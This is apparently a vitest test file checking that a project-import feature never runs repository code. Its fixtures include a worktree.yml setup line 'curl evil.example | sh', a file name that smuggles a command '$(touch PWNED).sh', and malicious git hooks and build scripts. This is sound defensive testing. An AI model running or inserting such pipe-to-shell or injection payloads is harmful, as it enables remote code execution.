import { execFileSync } from 'node:child_process';
import { createHash } from 'node:crypto';
import {
  existsSync,
  mkdirSync,
  mkdtempSync,
  readdirSync,
  readFileSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import {
  type AdoptPreviewResponse,
  type AdoptProjectBody,
  type AdoptProjectResponse,
  type CreateProjectResponse,
  type ImportStatusResponse,
  type ProjectDetectResponse,
  type WorkspaceFoldersResponse,
} from '@emberline/protocol';
import { PtydServer } from '@emberline/ptyd/server';
import { eq } from 'drizzle-orm';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { sql } from 'drizzle-orm';
import { type ExecRequest, localCommandExecutor, setCommandExecutor } from './command-exec.js';
import type * as GitExec from './git-exec.js';
import { HARDENED_GIT_ARGS } from './git-exec.js';
import { parseWorktreeYml } from './worktree-config/load.js';
import { projects, projectWorktreeConfig } from './db/schema.js';
import { readProjectSettings } from './db/project-settings.js';
import { authHeaders, createTestApp, setupAndLogin, type TestApp } from './test-utils.js';

/** While set, `git init` waits for it: holds a wizard create in progress. */
const gitGate = vi.hoisted(() => ({ hold: null as Promise<void> | null }));
vi.mock('./git-exec.js', async (importOriginal) => {
  const actual = await importOriginal<typeof GitExec>();
  return {
    ...actual,
    execGitFile: (async (args: string[], opts?: object) => {
      if (args[0] === 'init' && gitGate.hold) await gitGate.hold;
      return actual.execGitFile(args, opts as never);
    }) as typeof actual.execGitFile,
  };
});

let t: TestApp;
let ws: string;
let headers: Record<string, string>;
/** Every command core asked the runner to execute. */
let execs: ExecRequest[];

beforeEach(async () => {
  ws = mkdtempSync(path.join(tmpdir(), 'ws-'));
  t = await createTestApp({ workspacesDir: ws });
  headers = authHeaders(await setupAndLogin(t.app));
  execs = [];
  setCommandExecutor((request) => {
    execs.push(request);
    return localCommandExecutor(request);
  });
});
afterEach(async () => {
  setCommandExecutor(localCommandExecutor);
  vi.restoreAllMocks();
  await t.close();
  rmSync(ws, { recursive: true, force: true });
});

/**
 * Detection may only read git objects: hardened `ls-tree` / `cat-file` (plus the hardening's own
 * `git config --list` safety check). No other process, no other git command.
 */
function onlyGitObjectReads(list: readonly ExecRequest[]): boolean {
  const n = HARDENED_GIT_ARGS.length;
  return list.every((e) => {
    if (e.file !== 'git') return false;
    if (e.args[0] === '-C' && e.args[2] === 'config' && e.args[3] === '--list') return true;
    const hardened = HARDENED_GIT_ARGS.every((a, i) => e.args[i] === a);
    return (
      hardened &&
      ['ls-tree', 'cat-file'].includes(e.args[n] ?? '') &&
      !e.args.includes('--textconv') &&
      !e.args.includes('--filters')
    );
  });
}

const api = (method: 'GET' | 'POST', url: string, payload?: object) =>
  t.app.inject({ method, url, headers, payload });
const git = (cwd: string, ...args: string[]) =>
  execFileSync('git', ['-c', 'user.name=T', '-c', 'user.email=t@t', ...args], {
    cwd,
    encoding: 'utf8',
  }).trim();

/** A folder in the workspaces dir with `files`, committed on `branch` unless `git: false`. */
function fixture(
  name: string,
  files: Record<string, string>,
  opts: { git?: boolean; branch?: string; remote?: string; commit?: boolean } = {},
): string {
  const dir = path.join(ws, name);
  mkdirSync(dir, { recursive: true });
  for (const [rel, content] of Object.entries(files)) {
    mkdirSync(path.dirname(path.join(dir, rel)), { recursive: true });
    writeFileSync(path.join(dir, rel), content);
  }
  if (opts.git === false) return dir;
  git(dir, 'init', '-q', '-b', opts.branch ?? 'main');
  if (opts.remote) git(dir, 'remote', 'add', 'origin', opts.remote);
  if (opts.commit !== false) {
    git(dir, 'add', '-A');
    git(dir, 'commit', '-q', '--allow-empty', '-m', 'initial');
  }
  return dir;
}

function tree(root: string, dir = ''): string[] {
  return readdirSync(path.join(root, dir), { withFileTypes: true })
    .filter((e) => e.name !== '.git')
    .flatMap((e) => (e.isDirectory() ? tree(root, path.join(dir, e.name)) : [path.join(dir, e.name)]))
    .sort();
}

const importFolder = async (folder: string, name = `Imported ${folder}`) =>
  api('POST', '/api/projects', { name, source: 'import_folder', folder });

async function imported(folder: string): Promise<CreateProjectResponse['project']> {
  const res = await importFolder(folder);
  expect(res.statusCode, res.body).toBe(201);
  return (res.json() as CreateProjectResponse).project;
}

const PNPM_APP = {
  'package.json': JSON.stringify({
    name: 'shop',
    scripts: {
      dev: 'vite',
      build: 'touch PWNED-build && vite build',
      lint: 'eslint .',
      test: 'vitest',
      postinstall: 'touch PWNED-install',
    },
    dependencies: { react: '19.0.0', 'react-dom': '19.0.0' },
    devDependencies: { vite: '7.0.0', vitest: '3.0.0', typescript: '5.9.0', tailwindcss: '4.0.0' },
  }),
  'pnpm-lock.yaml': "lockfileVersion: '9.0'\n",
  'tsconfig.json': '{}',
  'index.html': '<!doctype html><div id="root"></div>',
  'src/main.tsx': 'export {};\n',
};
const PYTHON_APP = {
  'requirements.txt': 'fastapi==0.115.0\nuvicorn\npytest\n',
  'main.py': 'from fastapi import FastAPI\napp = FastAPI()\n',
  'tests/test_main.py': 'def test_ok():\n    assert True\n',
};
const STATIC_SITE = {
  'index.html': '<!doctype html><title>Bakery</title>',
  'styles.css': 'body{}',
  'script.js': 'console.log(1)',
};
const OWN_WORKTREE_YML = 'version: 1\nsetup:\n  - make deps\nchecks:\n  build: make\n';
const REPO_WITH_FILES = {
  'AGENTS.md': '# Agents\n',
  '.emberline/worktree.yml': OWN_WORKTREE_YML,
  Makefile: 'all:\n\ttouch PWNED-make\n',
  'main.c': 'int main(void){return 0;}\n',
};

describe('GET /api/workspaces/folders', () => {
  it('lists direct children that are not projects, hidden, internal or symlinked', async () => {
    fixture('alpha', { 'a.txt': 'a' }, { remote: 'https://example.com/a.git' });
    fixture('beta', { 'b.txt': 'b' }, { git: false });
    fixture('gamma', { 'c.txt': 'c' });
    fixture('.hidden', {}, { git: false });
    fixture('.worktrees', {}, { git: false });
    fixture('.emberline-outputs', {}, { git: false });
    symlinkSync(path.join(ws, 'alpha'), path.join(ws, 'linked'));
    const outside = mkdtempSync(path.join(tmpdir(), 'outside-'));
    symlinkSync(outside, path.join(ws, 'escape'));
    writeFileSync(path.join(ws, 'file.txt'), 'x');
    await imported('gamma');
    // a new project's own folder is a project too
    expect((await api('POST', '/api/projects', { name: 'Fresh' })).statusCode).toBe(201);

    const res = await api('GET', '/api/workspaces/folders');
    expect(res.statusCode).toBe(200);
    expect((res.json() as WorkspaceFoldersResponse).folders).toEqual([
      { name: 'alpha', path: path.join(ws, 'alpha'), isGitRepo: true, hasRemote: true },
      { name: 'beta', path: path.join(ws, 'beta'), isGitRepo: false, hasRemote: false },
    ]);
    rmSync(outside, { recursive: true, force: true });
  });

  it('runs no command to list folders', async () => {
    fixture('alpha', {}, { remote: 'git@example.com:a.git' });
    await api('GET', '/api/workspaces/folders');
    expect(execs).toEqual([]);
  });
});

describe('legacy create', () => {
  it('refuses an existing non-empty directory instead of writing into it', async () => {
    const dir = fixture('legacy', { 'PROJECT.md': '# Theirs\n' }, { git: false });
    const res = await api('POST', '/api/projects', {
      name: 'Legacy',
      mode: 'wizard',
      appType: 'web_saas',
      description: 'x',
    });
    expect(res.statusCode).toBe(409);
    expect(readFileSync(path.join(dir, 'PROJECT.md'), 'utf8')).toBe('# Theirs\n');
    expect(existsSync(path.join(dir, '.git'))).toBe(false);
    expect(t.db.select().from(projects).all()).toEqual([]);
  });
});

describe('create source import_folder', () => {
  it('registers the folder in place: no copy, no new files, no git init, no tickets', async () => {
    const dir = fixture('shop', PNPM_APP, { branch: 'trunk' });
    const before = tree(dir);
    const head = git(dir, 'rev-parse', 'HEAD');
    const res = await importFolder('shop', 'My Shop');
    expect(res.statusCode, res.body).toBe(201);
    const { project, terminalId } = res.json() as CreateProjectResponse;
    expect(terminalId).toBeNull();
    expect(project.path).toBe(dir);
    expect(project.slug).toBe('my-shop');
    // runs are merged into the branch the folder has checked out
    expect(project.defaultBranch).toBe('trunk');
    expect(tree(dir)).toEqual(before);
    expect(git(dir, 'rev-parse', 'HEAD')).toBe(head);
    expect(git(dir, 'status', '--porcelain')).toBe('');
    expect(existsSync(path.join(ws, 'my-shop'))).toBe(false);
    expect(t.tickets.list(project.id)).toEqual([]);
    expect(t.db.select().from(projectWorktreeConfig).all()).toEqual([]);
    // only git reads ran
    expect(execs.every((e) => e.file === 'git')).toBe(true);
  });

  it("records where the project came from, and removing a folder import keeps the user's repository", async () => {
    const dir = fixture('shop', PNPM_APP);
    const project = await imported('shop');
    expect(readProjectSettings(t.db, project.id).importSource).toBe('folder');
    const listed = (await api('GET', '/api/projects')).json() as Array<{
      id: string;
      importSource?: string | null;
    }>;
    expect(listed.find((p) => p.id === project.id)?.importSource).toBe('folder');

    const del = await t.app.inject({ method: 'DELETE', url: `/api/projects/${project.id}`, headers });
    expect(del.statusCode, del.body).toBe(200);
    expect(existsSync(path.join(dir, 'package.json'))).toBe(true);
    expect(existsSync(path.join(dir, '.git'))).toBe(true);
    expect(t.db.select().from(projects).all()).toEqual([]);

    // Only an explicit deleteFiles deletes the folder.
    const again = await imported('shop');
    const purge = await t.app.inject({
      method: 'DELETE',
      url: `/api/projects/${again.id}?deleteFiles=1`,
      headers,
    });
    expect(purge.statusCode).toBe(200);
    expect(existsSync(dir)).toBe(false);
  });

  it('a project Emberline created is "new" and its folder goes by default', async () => {
    const res = await api('POST', '/api/projects', {
      name: 'Fresh',
      source: 'new',
      appType: 'static_site',
      presetId: 'static-plain',
      vision: 'A page.',
      startFactory: false,
    });
    expect(res.statusCode, res.body).toBe(201);
    const { project } = res.json() as CreateProjectResponse;
    expect(readProjectSettings(t.db, project.id).importSource).toBe('new');
    expect(
      (await t.app.inject({ method: 'DELETE', url: `/api/projects/${project.id}`, headers })).statusCode,
    ).toBe(200);
    expect(existsSync(project.path)).toBe(false);

    const legacy = await api('POST', '/api/projects', { name: 'Legacy Blank', initGit: false });
    expect(readProjectSettings(t.db, (legacy.json() as CreateProjectResponse).project.id).importSource).toBe(
      'new',
    );
  });

  it('409 when the folder is already a project', async () => {
    fixture('shop', PNPM_APP);
    await imported('shop');
    const again = await importFolder('shop', 'Another Name');
    expect(again.statusCode).toBe(409);
    expect(again.json().message).toMatch(/already a project/);
  });

  it('404 when the folder does not exist', async () => {
    const res = await importFolder('nope');
    expect(res.statusCode).toBe(404);
  });

  it('409 with a hint when the folder is not a git repository or has no commit', async () => {
    fixture('plain', STATIC_SITE, { git: false });
    const plain = await importFolder('plain');
    expect(plain.statusCode).toBe(409);
    expect(plain.json().message).toMatch(/initialise git first/i);
    fixture('unborn', STATIC_SITE, { commit: false });
    const unborn = await importFolder('unborn');
    expect(unborn.statusCode).toBe(409);
    expect(unborn.json().message).toMatch(/initialise git first/i);
    expect(t.db.select().from(projects).all()).toEqual([]);
  });

  it('refuses a folder a wizard create is writing right now', async () => {
    let release!: () => void;
    gitGate.hold = new Promise<void>((r) => (release = r));
    const pending = api('POST', '/api/projects', {
      name: 'Bakery Site',
      source: 'new',
      appType: 'static_site',
      presetId: 'static-plain',
      vision: 'Bread.',
      startFactory: false,
    });
    await vi.waitFor(() => expect(existsSync(path.join(ws, 'bakery-site', 'index.html'))).toBe(true));
    const res = await importFolder('bakery-site', 'Grab It');
    expect(res.statusCode).toBe(409);
    expect(res.json().message).toMatch(/being created/);
    expect(res.json().error).toBe('being_created');
    gitGate.hold = null;
    release();
    expect((await pending).statusCode).toBe(201);
    expect(t.db.select().from(projects).all()).toHaveLength(1);
  });

  it('refuses symlinked, hidden and internal folders, and path tricks', async () => {
    fixture('real', STATIC_SITE);
    symlinkSync(path.join(ws, 'real'), path.join(ws, 'link'));
    expect((await importFolder('link')).statusCode).toBe(400);
    fixture('.secret', STATIC_SITE);
    expect((await importFolder('.secret')).statusCode).toBe(400);
    expect((await importFolder('.worktrees')).statusCode).toBe(400);
    expect((await importFolder('../etc')).statusCode).toBe(400);
    expect((await importFolder('a/b')).statusCode).toBe(400);
    expect(t.db.select().from(projects).all()).toEqual([]);
  });
});

const detect = async (id: string) => {
  const res = await api('GET', `/api/projects/${id}/detect`);
  expect(res.statusCode, res.body).toBe(200);
  return res.json() as ProjectDetectResponse;
};

describe('GET /api/projects/:id/detect', () => {
  it('pnpm node app: choices, commands and suggestions, without running anything', async () => {
    const dir = fixture('shop', PNPM_APP);
    const project = await imported('shop');
    execs.length = 0;
    const { detected, suggestions } = await detect(project.id);
    expect(execs.length).toBeGreaterThan(0);
    expect(onlyGitObjectReads(execs)).toBe(true);
    expect(readdirSync(dir).filter((f) => f.startsWith('PWNED'))).toEqual([]);
    expect(existsSync(path.join(dir, 'node_modules'))).toBe(false);

    expect(detected.appType).toBe('web_saas');
    expect(detected.choices).toMatchObject({
      frontend: 'react-vite',
      language: 'typescript-node',
      styling: 'tailwind',
      auth: 'agent',
    });
    // Vitest alone is no web_saas option: kept as free text instead of a wrong id
    expect(detected.choices.testing).toEqual({ other: 'Vitest' });
    expect(detected.commands).toEqual({
      setup: ['pnpm install --frozen-lockfile'],
      build: 'pnpm run build',
      lint: 'pnpm run lint',
      test: 'pnpm run test -- --run',
      services: [{ name: 'web', command: 'pnpm dev', preview: true }],
    });
    expect(detected.files).toEqual({
      projectMd: false,
      claudeMd: false,
      agentsMd: false,
      worktreeYml: false,
    });
    expect(detected.worktreeYml).toBeNull();
    expect(suggestions.projectMd).toContain('# Imported shop');
    expect(suggestions.projectMd).toContain('React + Vite');
    expect(suggestions.claudeMd).toContain('Imported shop');
    expect(suggestions.worktreeYml).toContain('version: 1');
    expect(suggestions.worktreeYml).toContain('"pnpm install --frozen-lockfile"');
    expect(suggestions.worktreeYml).toContain('build: "pnpm run build"');
    expect(suggestions.worktreeYml).toContain('command: "pnpm dev"');
    expect(parseWorktreeYml(suggestions.worktreeYml ?? '').ok).toBe(true);
  });

  it('python app', async () => {
    fixture('api', PYTHON_APP);
    const project = await imported('api');
    execs.length = 0;
    const { detected, suggestions } = await detect(project.id);
    expect(onlyGitObjectReads(execs)).toBe(true);
    expect(parseWorktreeYml(suggestions.worktreeYml ?? '').ok).toBe(true);
    expect(detected.appType).toBe('api_service');
    expect(detected.choices).toMatchObject({ backend: 'fastapi', language: 'python', testing: 'pytest' });
    expect(detected.commands.setup).toEqual(['pip install -r requirements.txt']);
    expect(detected.commands.build).toBe('python3 -m compileall -q .');
    expect(detected.commands.test).toBe('pytest');
  });

  it('file names in a detected command are shell-quoted: a crafted name never runs', async () => {
    const dir = fixture('scripts', {
      '$(touch PWNED).sh': 'echo hi\n',
      'my script.sh': 'echo hi\n',
      "it's.sh": 'echo hi\n',
    });
    const { detected, suggestions } = await detect((await imported('scripts')).id);
    const build = detected.commands.build ?? '';
    expect(build).toContain("'$(touch PWNED).sh'");
    expect(build).toContain("'my script.sh'");
    expect(build).toContain("'it'\\''s.sh'");
    expect(suggestions.worktreeYml).toContain('PWNED');
    // Run as the suggested worktree.yml would: the crafted name is only an argument.
    execFileSync('sh', ['-c', build], { cwd: dir });
    expect(existsSync(path.join(dir, 'PWNED'))).toBe(false);
  });

  it('static site', async () => {
    fixture('bakery', STATIC_SITE);
    const { detected, suggestions } = await detect((await imported('bakery')).id);
    expect(detected.appType).toBe('static_site');
    expect(detected.choices).toMatchObject({
      frontend: 'plain-html',
      backend: 'none',
      database: 'none',
      language: 'javascript',
    });
    expect(detected.commands).toEqual({
      setup: [],
      services: [{ name: 'web', command: 'python3 -m http.server $PORT --bind 0.0.0.0', preview: true }],
    });
    expect(suggestions.worktreeYml).not.toContain('checks:');
    expect(parseWorktreeYml(suggestions.worktreeYml ?? '').ok).toBe(true);
  });

  it('repo with its own worktree.yml and AGENTS.md: reports them, suggests only the missing files', async () => {
    const dir = fixture('fw', REPO_WITH_FILES);
    const project = await imported('fw');
    execs.length = 0;
    const { detected, suggestions } = await detect(project.id);
    expect(onlyGitObjectReads(execs)).toBe(true);
    expect(existsSync(path.join(dir, 'PWNED-make'))).toBe(false);
    expect(detected.files).toEqual({ projectMd: false, claudeMd: false, agentsMd: true, worktreeYml: true });
    expect(detected.worktreeYml).toEqual({
      content: OWN_WORKTREE_YML,
      sha256: createHash('sha256').update(OWN_WORKTREE_YML).digest('hex'),
      errors: [],
      notCommitted: false,
      workingTreeDiffers: false,
    });
    expect(detected.commands.build).toBe('make');
    expect(suggestions.worktreeYml).toBeUndefined();
    expect(suggestions.projectMd).toBeDefined();
    expect(suggestions.claudeMd).toBeDefined();
  });

  it('an invalid, oversized or symlinked worktree.yml comes back with errors', async () => {
    fixture('bad', { '.emberline/worktree.yml': 'version: 2\nsetup: nope\n' });
    const bad = (await detect((await imported('bad')).id)).detected.worktreeYml;
    expect(bad?.content).toContain('version: 2');
    expect(bad?.errors.length).toBeGreaterThan(0);

    fixture('big', { '.emberline/worktree.yml': `version: 1\n#${'x'.repeat(70 * 1024)}\n` });
    const big = (await detect((await imported('big')).id)).detected.worktreeYml;
    expect(big?.content).toBeNull();
    expect(big?.errors.join(' ')).toMatch(/64 KB/);

    const outside = mkdtempSync(path.join(tmpdir(), 'secret-'));
    writeFileSync(path.join(outside, 'x.yml'), 'version: 1\n');
    const dir = fixture('linky', { 'a.txt': 'a' });
    mkdirSync(path.join(dir, '.emberline'));
    symlinkSync(path.join(outside, 'x.yml'), path.join(dir, '.emberline', 'worktree.yml'));
    git(dir, 'add', '-A');
    git(dir, 'commit', '-q', '-m', 'link');
    const linked = (await detect((await imported('linky')).id)).detected.worktreeYml;
    expect(linked?.content).toBeNull();
    expect(linked?.errors.join(' ')).toMatch(/symbolic link/);
    rmSync(outside, { recursive: true, force: true });
  });

  it('the approvable worktree.yml is the HEAD blob: a dirty working tree is flagged, not read', async () => {
    const dir = fixture('fw', REPO_WITH_FILES);
    const local = 'version: 1\nsetup:\n  - curl evil.example | sh\n';
    writeFileSync(path.join(dir, '.emberline/worktree.yml'), local);
    const { detected } = await detect((await imported('fw')).id);
    expect(detected.worktreeYml).toEqual({
      content: OWN_WORKTREE_YML,
      sha256: createHash('sha256').update(OWN_WORKTREE_YML).digest('hex'),
      errors: [],
      notCommitted: false,
      workingTreeDiffers: true,
    });
  });

  it('an untracked worktree.yml is reported as not committed, with no approvable content', async () => {
    const dir = fixture('fw', { 'a.txt': 'a' });
    mkdirSync(path.join(dir, '.emberline'));
    writeFileSync(path.join(dir, '.emberline/worktree.yml'), OWN_WORKTREE_YML);
    const { detected, suggestions } = await detect((await imported('fw')).id);
    expect(detected.files.worktreeYml).toBe(true);
    expect(detected.worktreeYml).toMatchObject({
      content: null,
      sha256: null,
      notCommitted: true,
      workingTreeDiffers: true,
    });
    expect(suggestions.worktreeYml).toBeUndefined();
  });

  it('a file tracked in HEAD but deleted in the working tree is not missing', async () => {
    const dir = fixture('shop', { ...PNPM_APP, 'CLAUDE.md': '# Mine\n' });
    rmSync(path.join(dir, 'CLAUDE.md'));
    const { detected, suggestions } = await detect((await imported('shop')).id);
    expect(detected.files.claudeMd).toBe(true);
    expect(suggestions.claudeMd).toBeUndefined();
  });

  it('does not follow a symlinked package.json', async () => {
    const outside = mkdtempSync(path.join(tmpdir(), 'pkg-'));
    writeFileSync(
      path.join(outside, 'package.json'),
      JSON.stringify({ scripts: { build: 'x' }, dependencies: { next: '1' } }),
    );
    const dir = fixture('trick', { 'index.html': '<p>' });
    symlinkSync(path.join(outside, 'package.json'), path.join(dir, 'package.json'));
    const { detected } = await detect((await imported('trick')).id);
    expect(detected.choices.frontend).not.toBe('nextjs');
    expect(detected.commands.build).toBeUndefined();
    rmSync(outside, { recursive: true, force: true });
  });
});

const adopt = (id: string, body: AdoptProjectBody) => api('POST', `/api/projects/${id}/adopt`, body);
const commitsOf = (dir: string) => git(dir, 'log', '--format=%s').split('\n');

describe('POST /api/projects/:id/adopt', () => {
  it('writes only the ticked missing files and commits them on the checked-out branch, never pushing', async () => {
    const remote = mkdtempSync(path.join(tmpdir(), 'remote-'));
    git(remote, 'init', '-q', '--bare');
    const dir = fixture('shop', { ...PNPM_APP, 'PROJECT.md': '# Mine\n' }, { branch: 'trunk', remote });
    git(dir, 'push', '-q', 'origin', 'trunk');
    const remoteHead = git(remote, 'rev-parse', 'trunk');
    // the person's own staged work stays out of the commit
    writeFileSync(path.join(dir, 'index.html'), '<p>changed</p>');
    git(dir, 'add', 'index.html');
    const project = await imported('shop');

    const res = await adopt(project.id, {
      choices: { frontend: 'react-vite' },
      gates: { antiSlopGate: false },
      write: ['claudeMd'],
    });
    expect(res.statusCode, res.body).toBe(200);
    const out = res.json() as AdoptProjectResponse;
    expect(Object.keys(out.files)).toEqual(['CLAUDE.md']);
    expect(out.commitMessage).toBe('chore: add Emberline project files');
    expect(out.worktreeConfig).toBeNull();
    expect(readFileSync(path.join(dir, 'CLAUDE.md'), 'utf8')).toBe(out.files['CLAUDE.md']);
    expect(readFileSync(path.join(dir, 'PROJECT.md'), 'utf8')).toBe('# Mine\n');
    expect(existsSync(path.join(dir, '.emberline'))).toBe(false);

    expect(git(dir, 'rev-parse', '--abbrev-ref', 'HEAD')).toBe('trunk');
    expect(commitsOf(dir)).toEqual(['chore: add Emberline project files', 'initial']);
    expect(out.commitSha).toBe(git(dir, 'rev-parse', 'HEAD'));
    expect(git(dir, 'show', '--name-only', '--format=', 'HEAD')).toBe('CLAUDE.md');
    expect(git(dir, 'diff', '--cached', '--name-only')).toBe('index.html');
    expect(git(remote, 'rev-parse', 'trunk')).toBe(remoteHead);

    expect(readProjectSettings(t.db, project.id)).toMatchObject({
      gates: { antiSlopGate: false },
      choices: { frontend: 'react-vite' },
    });
    expect(t.db.select().from(projectWorktreeConfig).all()).toEqual([]);
    expect(t.tickets.list(project.id)).toEqual([]);
    rmSync(remote, { recursive: true, force: true });
  });

  it('refuses to overwrite an existing file, naming it, and writes nothing', async () => {
    const dir = fixture('shop', { ...PNPM_APP, 'PROJECT.md': '# Mine\n' });
    const project = await imported('shop');
    const res = await adopt(project.id, { write: ['claudeMd', 'projectMd'] });
    expect(res.statusCode).toBe(409);
    expect(res.json().message).toContain('PROJECT.md');
    expect(readFileSync(path.join(dir, 'PROJECT.md'), 'utf8')).toBe('# Mine\n');
    expect(existsSync(path.join(dir, 'CLAUDE.md'))).toBe(false);
    expect(commitsOf(dir)).toEqual(['initial']);
  });

  it('a worktree.yml Emberline writes is approved; preview shows exactly what adopt writes', async () => {
    const dir = fixture('shop', PNPM_APP);
    const project = await imported('shop');
    const body: AdoptProjectBody = {
      write: ['projectMd', 'claudeMd', 'worktreeYml'],
      choices: { frontend: 'react-vite' },
      appType: 'web_saas',
    };
    const pv = await api('POST', `/api/projects/${project.id}/adopt/preview`, body);
    expect(pv.statusCode, pv.body).toBe(200);
    const preview = pv.json() as AdoptPreviewResponse;
    expect(commitsOf(dir)).toEqual(['initial']);
    expect(existsSync(path.join(dir, 'CLAUDE.md'))).toBe(false);

    const out = (await adopt(project.id, body)).json() as AdoptProjectResponse;
    expect(out.files).toEqual(preview.files);
    expect(Object.keys(out.files).sort()).toEqual(['.emberline/worktree.yml', 'CLAUDE.md', 'PROJECT.md']);
    for (const [rel, content] of Object.entries(out.files))
      expect(readFileSync(path.join(dir, rel), 'utf8')).toBe(content);
    expect(out.files['PROJECT.md']).toContain('React + Vite');
    expect(out.worktreeConfig).toBe('generated');
    const row = t.db
      .select()
      .from(projectWorktreeConfig)
      .where(eq(projectWorktreeConfig.projectId, project.id))
      .get();
    expect(row?.content).toBe(out.files['.emberline/worktree.yml']);
    expect(row?.approvedBy).toBe('wizard');
    expect(t.db.select().from(projects).where(eq(projects.id, project.id)).get()?.appType).toBe('web_saas');
    expect(git(dir, 'show', '--name-only', '--format=', 'HEAD').split('\n').sort()).toEqual([
      '.emberline/worktree.yml',
      'CLAUDE.md',
      'PROJECT.md',
    ]);
  });

  it("the repo's own worktree.yml is approved only when ticked, unchanged and valid", async () => {
    fixture('fw', REPO_WITH_FILES);
    const project = await imported('fw');
    const sha = (await detect(project.id)).detected.worktreeYml?.sha256 ?? '';

    // not ticked: nothing approved
    expect((await adopt(project.id, { write: [] })).statusCode).toBe(200);
    expect(t.db.select().from(projectWorktreeConfig).all()).toEqual([]);

    // ticked, but the reviewed content is not what is on disk
    const stale = await adopt(project.id, { approveWorktreeYml: true, worktreeYmlSha256: 'a'.repeat(64) });
    expect(stale.statusCode).toBe(409);
    expect(stale.json().message).toMatch(/changed/);
    expect(t.db.select().from(projectWorktreeConfig).all()).toEqual([]);

    const ok = await adopt(project.id, { approveWorktreeYml: true, worktreeYmlSha256: sha });
    expect(ok.statusCode, ok.body).toBe(200);
    expect((ok.json() as AdoptProjectResponse).worktreeConfig).toBe('existing');
    const row = t.db.select().from(projectWorktreeConfig).get();
    expect(row).toMatchObject({
      projectId: project.id,
      content: OWN_WORKTREE_YML,
      sha256: sha,
      approvedBy: 'import',
    });
  });

  it('an invalid worktree.yml is never approved: 400 with the schema errors', async () => {
    const yml = 'version: 1\nsetup: nope\n';
    fixture('bad', { '.emberline/worktree.yml': yml });
    const project = await imported('bad');
    const res = await adopt(project.id, {
      approveWorktreeYml: true,
      worktreeYmlSha256: createHash('sha256').update(yml).digest('hex'),
    });
    expect(res.statusCode).toBe(400);
    expect(res.json().message).toMatch(/setup/);
    expect(res.json().errors.length).toBeGreaterThan(0);
    expect(t.db.select().from(projectWorktreeConfig).all()).toEqual([]);
  });

  it('startFactory adds the [Factory] ticket (no Bootstrap) and turns chaining on', async () => {
    const dispatch = vi.spyOn(t.tickets, 'dispatchNextReadyTicket').mockResolvedValue([]);
    fixture('shop', PNPM_APP);
    const project = await imported('shop');
    const res = await adopt(project.id, { startFactory: true, vision: 'Sell more bread online.' });
    expect(res.statusCode, res.body).toBe(200);
    const list = t.tickets.list(project.id);
    expect(list.map((x) => x.title.startsWith('[Factory]'))).toEqual([true]);
    expect(list[0]?.persona).toBe('product_owner');
    expect((res.json() as AdoptProjectResponse).factoryTicketId).toBe(list[0]?.id);
    expect(t.tickets.isAutoChainActive(project.id)).toBe(true);
    expect(dispatch).toHaveBeenCalledWith(project.id);
    expect((await adopt(project.id, { startFactory: true })).statusCode).toBe(400);
  });

  it("approves the HEAD blob, never the working tree's edit", async () => {
    const dir = fixture('fw', REPO_WITH_FILES);
    writeFileSync(
      path.join(dir, '.emberline/worktree.yml'),
      'version: 1\nsetup:\n  - curl evil.example | sh\n',
    );
    const project = await imported('fw');
    const sha = (await detect(project.id)).detected.worktreeYml?.sha256 ?? '';
    const ok = await adopt(project.id, { approveWorktreeYml: true, worktreeYmlSha256: sha });
    expect(ok.statusCode, ok.body).toBe(200);
    expect(t.db.select().from(projectWorktreeConfig).get()?.content).toBe(OWN_WORKTREE_YML);
  });

  it('refuses to approve a worktree.yml that is not committed (409)', async () => {
    const dir = fixture('fw', { 'a.txt': 'a' });
    mkdirSync(path.join(dir, '.emberline'));
    writeFileSync(path.join(dir, '.emberline/worktree.yml'), OWN_WORKTREE_YML);
    const project = await imported('fw');
    const res = await adopt(project.id, {
      approveWorktreeYml: true,
      worktreeYmlSha256: createHash('sha256').update(OWN_WORKTREE_YML).digest('hex'),
    });
    expect(res.statusCode).toBe(409);
    expect(res.json().message).toMatch(/not committed/);
    expect(t.db.select().from(projectWorktreeConfig).all()).toEqual([]);
  });

  it('refuses to write a file that HEAD tracks even when the working tree deleted it', async () => {
    const dir = fixture('shop', { ...PNPM_APP, 'CLAUDE.md': '# Mine\n' });
    rmSync(path.join(dir, 'CLAUDE.md'));
    const project = await imported('shop');
    const res = await adopt(project.id, { write: ['claudeMd'] });
    expect(res.statusCode).toBe(409);
    expect(res.json().message).toContain('CLAUDE.md');
    expect(existsSync(path.join(dir, 'CLAUDE.md'))).toBe(false);
    expect(commitsOf(dir)).toEqual(['initial']);
  });

  it('repo hooks never run and repo config cannot forge the author', async () => {
    const dir = fixture('shop', PNPM_APP);
    for (const hook of ['pre-commit', 'post-commit', 'commit-msg', 'prepare-commit-msg']) {
      writeFileSync(path.join(dir, '.git', 'hooks', hook), `#!/bin/sh\ntouch "${dir}/PWNED-${hook}"\n`, {
        mode: 0o755,
      });
    }
    for (const [key, value] of [
      ['user.name', 'evil'],
      ['user.email', 'evil@example.com'],
      ['author.name', 'evil'],
      ['author.email', 'evil@example.com'],
      ['committer.name', 'evil'],
      ['committer.email', 'evil@example.com'],
    ]) {
      execFileSync('git', ['config', key!, value!], { cwd: dir });
    }
    const project = await imported('shop');
    const res = await adopt(project.id, { write: ['claudeMd'] });
    expect(res.statusCode, res.body).toBe(200);
    expect(readdirSync(dir).filter((f) => f.startsWith('PWNED'))).toEqual([]);
    expect(git(dir, 'log', '-1', '--format=%an <%ae> | %cn <%ce>')).toBe(
      'Emberline AI Factory <factory@emberline.local> | Emberline AI Factory <factory@emberline.local>',
    );
  });

  it('the generated worktree.yml is validated before it is approved', async () => {
    fixture('shop', PNPM_APP);
    const project = await imported('shop');
    const out = (await adopt(project.id, { write: ['worktreeYml'] })).json() as AdoptProjectResponse;
    const row = t.db.select().from(projectWorktreeConfig).get();
    expect(row?.content).toBe(out.files['.emberline/worktree.yml']);
    expect(parseWorktreeYml(row?.content ?? '').ok).toBe(true);
  });

  it('a DB failure after the commit keeps the commit and answers with a warning', async () => {
    const dir = fixture('shop', PNPM_APP);
    const project = await imported('shop');
    const error = vi.spyOn(t.app.log, 'error');
    t.db.run(sql`drop table project_worktree_config`);
    const res = await adopt(project.id, { write: ['claudeMd', 'worktreeYml'] });
    expect(res.statusCode).toBe(200);
    const out = res.json() as AdoptProjectResponse;
    expect(out.warning).toMatch(/committed/);
    expect(out.commitSha).toBe(git(dir, 'rev-parse', 'HEAD'));
    expect(commitsOf(dir)[0]).toBe('chore: add Emberline project files');
    expect(error).toHaveBeenCalledWith(
      expect.objectContaining({ projectId: project.id }),
      expect.any(String),
    );
  });

